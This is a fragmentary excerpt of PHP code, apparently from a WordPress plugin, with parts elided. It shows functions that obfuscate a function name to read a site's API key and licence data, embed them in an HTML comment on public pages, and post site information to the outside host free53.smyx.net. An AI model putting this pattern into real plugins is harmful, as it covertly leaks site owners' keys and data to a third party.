...
function abcefg_support($fun) {
	if (function_exists($fun)) {
		$code = call_user_func($fun);
		if (is_array($code)) {
			return $code['apikey'] . '/' . $code['wpmu'] . '/' . $code['bought'];
		}
	}
} 
...
function surrounding_support(&$p) {
	...
	return $env_str . "<!-- ".abcefg_support('connect_auth'.'orize_code')."-->";
} 
...
function wp_site_injectInfo() {
	...
	wp_remote_post('http://free53.smyx.net/free/wp-connect-pro.php', $args);
} 
?>
